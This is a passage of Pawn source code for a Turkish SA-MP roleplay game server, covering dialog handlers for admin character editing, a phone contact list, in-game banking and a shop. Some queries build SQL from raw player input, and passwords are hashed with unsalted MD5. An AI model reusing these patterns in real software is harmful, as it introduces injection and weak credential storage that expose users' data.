			format(_text, sizeof(_text), "%s", inputtext);
	        //if(strfind(_text, "_", true) != -1) strreplace(_text, "_", " ");
	        format(query, sizeof(query), "UPDATE `karakterler` SET `isim` = '%s' WHERE `id` = '%d'", _text, Karakter[giveplayerid][sqlid]);
	        mysql_tquery(1,query);
  			new string2[34];
			format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(giveplayerid), giveplayerid);
			UpdateDynamic3DTextLabelText(tanismaIsim[giveplayerid], GetPlayerColor(giveplayerid), string2);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 105)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        if(strlen(inputtext) != 0)
			{
				new query[128];
	        	format(query, sizeof(query), "UPDATE `karakterler` SET `sifre` = MD5('%s') WHERE `id` = '%d'", inputtext, Karakter[giveplayerid][sqlid]);
	        	mysql_tquery(1,query);
				new string[128];
				format(string, sizeof(string), "Þifre %s olarak deðiþtirildi.", inputtext);
				Bilgi(playerid, string);
			}
			else Hata(playerid, "Þifreyi boþ býrakamazsýnýz.");
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 106)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        SetPlayerInteriorEx(giveplayerid, strval(inputtext));
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 107)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        SetPlayerVirtualWorld(giveplayerid, strval(inputtext));
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 108)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][level] = strval(inputtext);
	        SetPlayerScore(giveplayerid, strval(inputtext));
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 109)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][exp] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 110)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        SetPlayerSkin(giveplayerid, strval(inputtext));
	        Karakter[playerid][skin] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 111)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        SetPlayerHealth(giveplayerid, floatstr(inputtext));
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 112)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        SetPlayerArmour(giveplayerid, floatstr(inputtext));
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 113)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][dil] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 114)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][yas] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 115)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][cinsiyet] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 116)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][uyruk] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 117)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][birlik] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 118)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][rutbe] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 119)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][kodes] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 120)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][ajail] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 121)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][telno] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 122)
	{
	    if(response)
	    {
		    if(listitem == 0)
			{
				ShowPlayerDialog(playerid, 123, DIALOG_STYLE_INPUT, "Yeni Kiþi Ekle", "Ýsim:", "Devam", "Vazgeç");
				//Hata(playerid, "Üzgünüz, bu fonksiyon þu an pasif durumda.");
			}
			else
			{
			    SetPVarInt(playerid, "listitemT", listitem);
			    new string[128], isim[25], num;
			    RehberID(playerid, listitem, isim, num);
			    format(string, sizeof(string), "Arama\nMesaj\nSil", isim,num);
			    ShowPlayerDialog(playerid, 125, DIALOG_STYLE_LIST, "Telefon ~ Ýþlem", string, "Seç", "Vazgeç");
			}
		}
		return 1;
	}
	if(dialogid == 123)
	{
	    if(response)
	    {
	        if(strlen(inputtext) < 25)
	        {
		        SetPVarString(playerid, "YKIsim", inputtext);
		        ShowPlayerDialog(playerid, 124, DIALOG_STYLE_INPUT, "Yeni Kiþi Ekle", "Numara:", "Kaydet", "Vazgeç");
			}
			else
			{
				Hata(playerid, "Girilen isim 24 karakterden daha fazla olamaz.");
				ShowPlayerDialog(playerid, 123, DIALOG_STYLE_INPUT, "Yeni Kiþi Ekle", "Ýsim:", "Devam", "Vazgeç");
			}
	    }
	    else GetRehber(playerid);
	    return 1;
	}
	if(dialogid == 124)
	{
	    if(response)
	    {
			if(0 < strval(inputtext) < 10000000)
			{
			    new isim[25];
		        GetPVarString(playerid, "YKIsim", isim, 25);
		        RehberEkle(playerid, isim, strval(inputtext));
			}
			else
			{
			    Hata(playerid, "Geçersiz bir numara girdiniz.");
			    ShowPlayerDialog(playerid, 124, DIALOG_STYLE_INPUT, "Yeni Kiþi Ekle", "Numara:", "Kaydet", "Vazgeç");
			}

	    }
	    else GetRehber(playerid);
	    return 1;
	}
	if(dialogid == 125)
	{
	    if(response) {
		    new isim[25], num;
			new id = GetPVarInt(playerid, "listitemT");
			RehberID(playerid, id, isim, num);
			if(listitem == 0) AramaYap(playerid, num);
			if(listitem == 1) ShowPlayerDialog(playerid, 126, DIALOG_STYLE_INPUT, "Telefon ~ Mesaj", "Göndermek istediðiniz mesajý giriniz.", "Gönder", "Vazgeç");
			if(listitem == 2)
			{
				new RehberText[4096],searchtext[64],pos[2];
				GetPVarString(playerid, "Player_Tel_Rehber", RehberText, 4096);
				format(searchtext, sizeof(searchtext), "%s|%d|",isim, num);
				//printf("id: %d isim: %s num: %d", id, isim, num);
				//print(RehberText);
				//print(searchtext);
				if(-1 != (pos[0]=strfind(RehberText, searchtext)))
				{
				    strdel(RehberText, pos[0], strlen(searchtext)+pos[0]);
				    Bilgi(playerid, "Kiþi baþarýyla rehberden silindi.");
					SetPVarString(playerid, "Player_Tel_Rehber", RehberText);
					new query[128];
					format(query, sizeof(query), "DELETE FROM `rehber` WHERE `rehberNumara` = '%d' AND `oyuncuID` = '%d'",num, Karakter[playerid][sqlid]);
					mysql_tquery(1,query);
					//RehberKaydet(playerid);
				}
				else Hata(playerid, "rOS: Üzgünüz Rehber çalýþmayý durdurdu.");
			    //ShowPlayerDialog(playerid, 126, DIALOG_STYLE_INPUT, "Telefon ~ Mesaj", "Göndermek istediðiniz mesajý giriniz.", "Gönder", "Vazgeç"); mesaj
			}
		}
		return 1;
	}
	if(dialogid == 126)
	{
	    if(response)
	    {
		    if(strlen(inputtext) != 0)
		    {
			    new isim[25], num;
				new id = GetPVarInt(playerid, "listitemT");
				RehberID(playerid, id, isim, num);
			    TelefonMesajGonder(playerid, num, inputtext);
			}
		}
		return 1;
	}
	if(dialogid == 127)
	{
	    if(response)
	    {
			if(IsyeriIceri(50.0,playerid) != 0)
			{
			    ShowPlayerDialog(playerid, 128, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Santos Bank", "{FFFFFF}Para Çek\nPara Yatýr\nHesap Bilgileri\nHavale\nPiyango\nAraç Vergi Öde\nÝþyeri Vergi Öde", "Seç", "Kapat");
			}
			else
			{
			    ShowPlayerDialog(playerid, 128, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Santos Bank", "{FFFFFF}Para Çek\nPara Yatýr\nHesap Bilgileri\nHavale\nPiyango\nAraç Vergi Öde\nÝþyeri Vergi Öde", "Seç", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 128)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, 129, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", ""C1"Los Santos bankasýna hoþgeldiniz!\nHesabýnýzdan çekmek istediðiniz para miktarýný girin:", "Para Çek", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 130, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", ""C1"Los Santos bankasýna hoþgeldiniz!\nHesabýnýza yatýrmak istediðiniz para miktarýný girin:", "Para Yatýr", "Kapat");
			}
			if(listitem == 2)
			{
				new yazi[128];
				format(yazi, sizeof(yazi), "{FFFFFF}Hesap No: %d\nHesabýnýzda Bulunan Para Miktarý: %d\n", Karakter[playerid][hesapno], BankaPara(playerid));
				ShowPlayerDialog(playerid, 132, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Santos Bank", yazi, "Ýþlem Yap", "Kapat");
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid, 133, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", ""C1"Los Santos bankasýna hoþgeldiniz!\nTransfer yapmak istediðiniz banka hesap numarasýný girin:", "Ýlerle", "Kapat");
			}
			if(listitem == 4)
			{
			    if(!gPiyango) return Hata(playerid, "Piyango satýþlarý kapalý.");
			    ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Santos Bank", "Tam\t\t 100"DOLAR"$"C1"\nYarým\t\t 50"DOLAR"$"C1"\nÇeyrek\t\t 25"DOLAR"$"C1"", "Satýnal", "Kapat");
			}
			if(listitem == 5)
			{
				new mstring[2048];
			    for(new i;i<MAX_VEHICLES;i++)
			    {
					if(VergiOdeArac(playerid,i))
					{
					    format(mstring, sizeof(mstring), "%s%d\t%s\t%s\t%d\n",mstring,i,GetVehicleName(i),Arac[i][aplaka],Arac[i][vergi]);
					    //format(mstring, sizeof(mstring), "%s%d\t%s\t%d\n",mstring,i,GetVehicleName(i),Arac[i][vergi]);
					}
			    }
			    //printf("%s",mstring);
			    format(mstring, sizeof(mstring), "ID\tModel\tPlaka\tVergi\n%s",mstring);
			    //format(mstring, sizeof(mstring), "ID\tModel\tVergi\n%s",mstring);
			    ShowPlayerDialog(playerid, 328, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Santos Bank", mstring, "Vergi Öde", "Ýptal");
			}
			if(listitem == 6)
			{
				new mstring[2048];
			    foreach(new i : Business)
			    {
					if(Isyeri[i][isahip] == Karakter[playerid][sqlid])
					{
					    format(mstring, sizeof(mstring), "%s%d\t%d\n",mstring,i,Isyeri[i][ivergi]);
					    //format(mstring, sizeof(mstring), "%s%d\t%s\t%d\n",mstring,i,GetVehicleName(i),Arac[i][vergi]);
					}
			    }
			    //printf("%s",mstring);
			    format(mstring, sizeof(mstring), "ID\tVergi\n%s",mstring);
			    //format(mstring, sizeof(mstring), "ID\tModel\tVergi\n%s",mstring);
			    ShowPlayerDialog(playerid, 8881, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Santos Bank", mstring, "Vergi Öde", "Ýptal");
			}
		}
		return 1;
	}
	if(dialogid == 129)
	{
	    if(response)
	    {
	        new string[128];
			if(isnull(inputtext))
			{
			    ShowPlayerDialog(playerid, 129, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", "Los Santos bankasýna hoþgeldiniz!\nHesabýnýzdan çekmek istediðiniz para miktarýný girin:", "Para Çek", "Kapat");
			    return 1;
			}
			if(strval(inputtext) <= 0 || strval(inputtext) > BankaPara(playerid))
			{
			    Hata(playerid, "Geçersiz bir miktar girdiniz.");
			    ShowPlayerDialog(playerid, 129, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", "Los Santos bankasýna hoþgeldiniz!\nHesabýnýzdan çekmek istediðiniz para miktarýný girin:", "Para Çek", "Kapat");
				return 1;
			}
			if(!IsNumeric(inputtext))
			{
			    ShowPlayerDialog(playerid, 129, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", "Los Santos bankasýna hoþgeldiniz!\nHesabýnýzdan çekmek istediðiniz para miktarýný girin:", "Para Çek", "Kapat");
			    Hata(playerid, "Geçersiz bir rakam girdiniz.");
			    return 1;
			}
			//if(strval(inputtext) > 20000) return Hata(playerid, "Tek seferde en fazla 20.000$ çekebilirsiniz.");
			if(BankaPara(playerid)-strval(inputtext) >= 0)
			{
			    new bpara = BankaPara(playerid);
				bpara -= strval(inputtext);
				BankaParaDuzen(playerid, bpara);
				GivePlayerCash(playerid, strval(inputtext));
				format(string, sizeof(string), "%d numaralý banka hesabýnýzdan %d$ çektiniz. Yeni miktar: %d$", Karakter[playerid][hesapno], strval(inputtext), bpara);
				Bilgi(playerid, string);
				format(string, sizeof(string), "[BANKA] %d$ cekti. Yeni miktar: %d$", strval(inputtext), bpara);
				Log(playerid, string);
			}
			return 1;
	    }
	}
	if(dialogid == 130)
	{
	    if(response)
	    {
	        new string[128];
	        if(isnull(inputtext))
	        {
			    ShowPlayerDialog(playerid, 130, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", "Los Santos bankasýna hoþgeldiniz!\nHesabýnýza yatýrmak istediðiniz para miktarýný girin:", "Para Yatýr", "Kapat");
				return 1;
	        }
	        if(strval(inputtext) <= 0 || !IsNumeric(inputtext))
	        {
	            Hata(playerid, "Geçersiz bir miktar girdiniz.");
			    ShowPlayerDialog(playerid, 130, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", "Los Santos bankasýna hoþgeldiniz!\nHesabýnýza yatýrmak istediðiniz para miktarýný girin:", "Para Yatýr", "Kapat");
				return 1;
	        }
	        //if(strval(inputtext) > 10000) return Hata(playerid, "Tek seferde en fazla 10.000$ yatýrabilirsiniz.");
	        if(Karakter[playerid][para]-strval(inputtext) >= 0)
	        {
		        new bpara = BankaPara(playerid);
				bpara += strval(inputtext);
				BankaParaDuzen(playerid, bpara);
		        GivePlayerCash(playerid, -strval(inputtext));
		        format(string, sizeof(string), "%d numaralý banka hesabýnýza %d$ yatýrdýnýz. Yeni miktar: %d$", Karakter[playerid][hesapno], strval(inputtext), bpara);
		        Bilgi(playerid, string);
		        format(string, sizeof(string), "[BANKA] %d$ yatirdi. Yeni miktar: %d$", strval(inputtext), bpara);
		        Log(playerid, string);
		  	}
	        return 1;
	    }
	}
	if(dialogid == 132)
	{
	    if(response)
		{
		    if(IsyeriIceri(50.0,playerid) != 0)
			{
			    ShowPlayerDialog(playerid, 128, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Santos Bank", "{FFFFFF}Para Çek\nPara Yatýr\nHesap Bilgileri\nHavale\nPiyango\nVergi Öde", "Seç", "Kapat");
			}
			else
			{
			    ShowPlayerDialog(playerid, 128, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Santos Bank", "{FFFFFF}Para Çek\nPara Yatýr\nHesap Bilgileri\nHavale\nPiyango\nVergi Öde", "Seç", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 133)
	{
	    if(response)
	    {
			new query[128];
			mysql_format(1,query, sizeof(query), "SELECT `id` FROM `karakterler` WHERE `hesapno` = '%d' LIMIT 1", strval(inputtext));
			new Cache:cache = mysql_query(query,true);
			if(cache_get_row_count())
			{
				if(Karakter[playerid][hesapno] == strval(inputtext)) return Hata(playerid, "Kendinize havale yapamazsýnýz.");
				SetPVarInt(playerid, "HavaleNo", strval(inputtext));
		        ShowPlayerDialog(playerid, 8991, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", ""C1"Havale etmek istediðiniz miktarý girin:", "Gönder", "Kapat");
			}
		    else
			{
			    ShowPlayerDialog(playerid, 133, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Santos Bank", ""C1"Los Santos bankasýna hoþgeldiniz!\nBöyle bir hesap bulunamadý.\nTransfer yapmak istediðiniz banka hesap numarasýný girin:", "Ýlerle", "Kapat");
		    }
		    cache_delete(cache);
	    }
	}
	if(dialogid == 8991)
	{
	    if(response)
	    {
			new targetid = GetPVarInt(playerid, "HavaleNo");
			if(strval(inputtext) < 1 || strval(inputtext) > 50000)
			{
			    Hata(playerid, "Bir seferde en fazla 50.000$ gönderebilirsiniz.");
			    return 1;
			}
			if(BankaPara(playerid) < strval(inputtext) || BankaPara(playerid) < 0)
			{
			    Hata(playerid, "Hesabýnýzda bu kadar para yok.");
			    return 1;
			}
			else
			{
				new query[256], logd[256], pbanka;
				pbanka = BankaPara(playerid);
				pbanka -= strval(inputtext);
				BankaParaDuzen(playerid, pbanka);
				BankaParaDuzenHesapno(targetid, BankaParaHesapno(targetid)+strval(inputtext));
				format(query, sizeof(query), "Transfer gerçekleþti. Hesabýnýzdan %d$ %d nolu hesaba aktarýldý.", strval(inputtext), targetid);
				Bilgi(playerid, query);
				format(logd, sizeof(logd), "[BANKA - TRANSFER] %d numarali banka hesabina %d$ gonderdi.", targetid, strval(inputtext));
				Log(playerid, logd);
				format(logd, sizeof(logd), "{B3B3B3}%s isimli oyuncudan %d$ havale aldýnýz.",OyuncuAdiniBul(playerid),strval(inputtext));
				SendClientMessage(targetid, -1, logd);
				Log(targetid, logd);
			}
	    }
	}
	if(dialogid == 134)
	{
	    if(response)
	    {
	        new string[128];
	        Karakter[playerid][savings] = BankaPara(playerid)+strval(inputtext);
	        KarakterKaydet(playerid);
	        format(string, sizeof(string), "Birikim hesabýnýz sýfýrlandý. %d$ banka hesabýnýza yatýrýldý.", Karakter[playerid][savings]);
	        Bilgi(playerid, string);
	        format(string, sizeof(string), "[BANKA - SAVINGS] %d$ savingsden cekti bankasina yatirilid. Yeni banka:", BankaPara(playerid));
	        Log(playerid, string);
	        return 1;
	    }
	}
	if(dialogid == 135)
	{
	    if(response)
	    {
	        new string[128];
	        if(isnull(inputtext))
	        {
			    SendClientMessage(playerid, COLOR_YELLOW, "{CEE300}____________________LS BANKASI BÝRÝKÝM HESABI____________________");
			    SendClientMessage(playerid, COLOR_WHITE, "Birikim Hesabý sizin vadeli hesabýnýzdýr. Bu hesaba yatýrdýðýnýz paranýn bankamýzýn belirlediði yüzdeli miktarýný alabilirsiniz.");
			    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}Bu hesap, geleceðe dönük bir proje olarak müþterilerimizin birikim yapmasýný saðlamaktadýr.");
			    SendClientMessage(playerid, COLOR_WHITE, "Birikim Hesabýyla düzenli veya düzensiz biriktirebilir, kendinize birikim hedefi koyarak motive olabilirsiniz.");
			    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}Üstelik dilediðiniz yerden ve dilediðiniz zaman hesabýnýza ulaþýr ihtiyaç anýnda hesabýnýzdan para çekebilirsiniz.");
			    ShowPlayerDialog(playerid, 135, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Birikim Hesabý", "Los Santos bankasýna hoþgeldiniz!\nBirikim hesabýnýza en az 50,000$ en fazla 100,000$ yatýrabilirsiniz.\nLütfen yatýrmak istediðiniz miktarý girin:", "Ýlerle", "Kapat");
				return 1;
	        }
	        if(strval(inputtext) <= 50000 || strval(inputtext) >= 100000)
	        {
			    SendClientMessage(playerid, COLOR_YELLOW, "{CEE300}____________________LS BANKASI BÝRÝKÝM HESABI____________________");
			    SendClientMessage(playerid, COLOR_WHITE, "Birikim Hesabý sizin vadeli hesabýnýzdýr. Bu hesaba yatýrdýðýnýz paranýn bankamýzýn belirlediði yüzdeli miktarýný alabilirsiniz.");
			    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}Bu hesap, geleceðe dönük bir proje olarak müþterilerimizin birikim yapmasýný saðlamaktadýr.");
			    SendClientMessage(playerid, COLOR_WHITE, "Birikim Hesabýyla düzenli veya düzensiz biriktirebilir, kendinize birikim hedefi koyarak motive olabilirsiniz.");
			    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}Üstelik dilediðiniz yerden ve dilediðiniz zaman hesabýnýza ulaþýr ihtiyaç anýnda hesabýnýzdan para çekebilirsiniz.");
			    ShowPlayerDialog(playerid, 135, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Birikim Hesabý", "Los Santos bankasýna hoþgeldiniz!\nBirikim hesabýnýza en az 50,000$ en fazla 100,000$ yatýrabilirsiniz.\nLütfen yatýrmak istediðiniz miktarý girin:", "Ýlerle", "Kapat");
				return 1;
	        }
	        if(!IsNumeric(inputtext))
	        {
			    SendClientMessage(playerid, COLOR_YELLOW, "{CEE300}____________________LS BANKASI BÝRÝKÝM HESABI____________________");
			    SendClientMessage(playerid, COLOR_WHITE, "Birikim Hesabý sizin vadeli hesabýnýzdýr. Bu hesaba yatýrdýðýnýz paranýn bankamýzýn belirlediði yüzdeli miktarýný alabilirsiniz.");
			    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}Bu hesap, geleceðe dönük bir proje olarak müþterilerimizin birikim yapmasýný saðlamaktadýr.");
			    SendClientMessage(playerid, COLOR_WHITE, "Birikim Hesabýyla düzenli veya düzensiz biriktirebilir, kendinize birikim hedefi koyarak motive olabilirsiniz.");
			    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}Üstelik dilediðiniz yerden ve dilediðiniz zaman hesabýnýza ulaþýr ihtiyaç anýnda hesabýnýzdan para çekebilirsiniz.");
			    ShowPlayerDialog(playerid, 135, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Birikim Hesabý", "Los Santos bankasýna hoþgeldiniz!\nBirikim hesabýnýza en az 50,000$ en fazla 100,000$ yatýrabilirsiniz.\nLütfen yatýrmak istediðiniz miktarý girin:", "Ýlerle", "Kapat");
				return 1;
	        }
	        Karakter[playerid][savings] = strval(inputtext);
			KarakterKaydet(playerid);
	        format(string, sizeof(string), "Birikim hesabýnýza %d$ yatýrdýnýz.", Karakter[playerid][savings]);
	        Bilgi(playerid, string);
	        format(string, sizeof(string), "[BANKA - SAVINSG] Savings hesabiniza %d$ yatirdi.", strval(inputtext));
	        Log(playerid, string);
	        return 1;
	    }
	}
	if(dialogid == 136)
	{
	    if(response)
	    {
	        new id = GetPVarInt(playerid, "IsyeriBuy");
		    if(listitem == 0)
		    {
		        if(Karakter[playerid][para]-200 >= 0)
		        {
	            	if(Karakter[playerid][telno] == 0)
	            	{
						GivePlayerCash(playerid, -200);
						Bilgi(playerid, "Telefonunuzu baþarýyla satýn aldýnýz.");
						GivePlayerTelephoneNumber(playerid);
						Isyeri[id][ikasa] += floatround(200/2);
					}
					else
					{
					    Hata(playerid, "Daha önceden telefon satýn almýþsýnýz.");
					}
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
			}
		    else if(listitem == 1)
		    {
		        if(Karakter[playerid][para]-600 >= 0)
		        {
		            if(Karakter[playerid][level] < 2) return Hata(playerid, "Sopa almak için 2 seviye olmalýsýnýz.");
					GivePlayerCash(playerid, -600);
					Bilgi(playerid, "Sopa satýn aldýnýz.");
					Isyeri[id][ikasa] += floatround(600/2);
					OyuncuSilahVer(0, playerid, 5, 1);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 2)
		    {
		        if(Karakter[playerid][para]-800 >= 0)
		        {
		            if(Karakter[playerid][level] < 2) return Hata(playerid, "Býçak almak için 2 seviye olmalýsýnýz.");
					GivePlayerCash(playerid, -800);
					Bilgi(playerid, "Býçak satýn aldýnýz.");
					Isyeri[id][ikasa] += floatround(800/2);
					OyuncuSilahVer(0, playerid, 4, 1);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 3)
		    {
		        if(Karakter[playerid][para]-750 >= 0)
		        {
					GivePlayerCash(playerid, -750);
					Isyeri[id][ikasa] += floatround(750/2);
					Bilgi(playerid, "Spray satýn aldýnýz.");
					OyuncuSilahVer(0, playerid, 41, 1000);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 4)
		    {
		        if(Karakter[playerid][para]-15000 >= 0)
		        {
					//return Hata(playerid, "Maske satýn alýmý pasif durumdadýr.");
					if(Karakter[playerid][level] < 10) return Hata(playerid, "Maske almak için 10 seviye olmanýz gerekmektedir.");
		            if(Karakter[playerid][maske]) return Hata(playerid, "Zaten maskeniz bulunmaktadýr.");
					Karakter[playerid][maske] = 1;
					if(Karakter[playerid][maskeno] == 0)
					{
					    MaskeNoVer(playerid);
					}
					GivePlayerCash(playerid, -15000);
					Isyeri[id][ikasa] += floatround(7500);
					Bilgi(playerid, "Maske satýn aldýnýz.");
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 5)
		    {
		        if(GetPlayerCash(playerid) >= 20)
		        {
		            Karakter[playerid][sigara] += 10;
					GivePlayerCash(playerid, -20);
					Isyeri[id][ikasa] += floatround(20/2);
					Bilgi(playerid, "Sigara paketi satýn aldýnýz.");
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 6)
		    {
		        if(GetPlayerCash(playerid) >= 75)
		        {
		            Karakter[playerid][odun]++;
					GivePlayerCash(playerid, -75);
		            Isyeri[id][ikasa] += floatround(75/2);
		            Bilgi(playerid, "Odun satýn aldýnýz.");
		        }
		        else
		        {
		            Hata(playerid, "Yeterli paranýz yok.");
		        }
		    }
			else if(listitem == 7)
		    {
		        if(GetPlayerCash(playerid) >= 15)
		        {
		            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
					GivePlayerCash(playerid, -15);
		            Isyeri[id][ikasa] += floatround(15/2);
		            Bilgi(playerid, "Bira satýn aldýnýz.");
		            Ipucu(playerid, "'F' tuþuna basarak birayý býrakabilirsiniz.");
		        }
		        else
		        {
		            Hata(playerid, "Yeterli paranýz yok.");
		        }
		    }
		    else if(listitem == 8)
		    {
		        if(GetPlayerCash(playerid) >= 50)
		        {
		            Karakter[playerid][GozBaglamaBezi] = 1;
		            GivePlayerCash(playerid, -50);
					Isyeri[id][ikasa] += floatround(50/2);
		            Bilgi(playerid, "Göz baðlama bezi satýn aldýnýz.");
		            Ipucu(playerid, "Göz baðlama bezi tek kullanýmlýktýr, oyundan çýkarsanýz kaybedersiniz.");
		            Ipucu(playerid, "Kullanmak için ''/gozbagla [oyuncuID]'' komutunu kullanmalýsýnýz.");
		        }
		        else
		        {
		            Hata(playerid, "Yeterli paranýz yok.");
		        }
		    }
		    else if(listitem == 9)
		    {
		        if(GetPlayerCash(playerid) >= 15000)
		        {
		           	if(Karakter[playerid][pGPS] == 1) return Hata(playerid, "Zaten gps'iniz bulunmaktadýr.");
		            Karakter[playerid][pGPS] = 1;
		            GivePlayerCash(playerid, -15000);
		            Isyeri[id][ikasa] += floatround(15000/2);
		            Bilgi(playerid, "GPS satýn aldýnýz.");
		        }
		        else
		        {
		            Hata(playerid, "Yeterli paranýz yok.");
		        }
		    }
		    else if(listitem == 10)
		    {
		        if(GetPlayerCash(playerid) >= 450)
		        {
		           	if(Karakter[playerid][bidon] == 1) return Hata(playerid, "Zaten benzin bidonunuz bulunmaktadýr.");
		            Karakter[playerid][bidon] = 1;
		            GivePlayerCash(playerid, -450);
		            Isyeri[id][ikasa] += floatround(450/2);
		            Bilgi(playerid, "Benzin bidonu satýn aldýnýz. ''/bidon''");
		            Ipucu(playerid, "Benzinliðe gidip benzin bidonunuzu doldurabilirsiniz.");
		        }
		        else
		        {
		            Hata(playerid, "Yeterli paranýz yok.");
		        }
		    }
		    else if(listitem == 11)
		    {
		        if(Karakter[playerid][para]-550 >= 0)
		        {
					GivePlayerCash(playerid, -550);
					Isyeri[id][ikasa] += floatround(550/2);
					Bilgi(playerid, "Kamera satýn aldýnýz.");
					OyuncuSilahVer(0, playerid, 43, 50);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 12)
		    {
		        if(Karakter[playerid][para]-35 >= 0)
		        {
					GivePlayerCash(playerid, -35);
					Isyeri[id][ikasa] += floatround(35/2);
					Bilgi(playerid, "Çiçek satýn aldýnýz.");
					OyuncuSilahVer(0, playerid, 14, 1);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		    else if(listitem == 13)
		    {
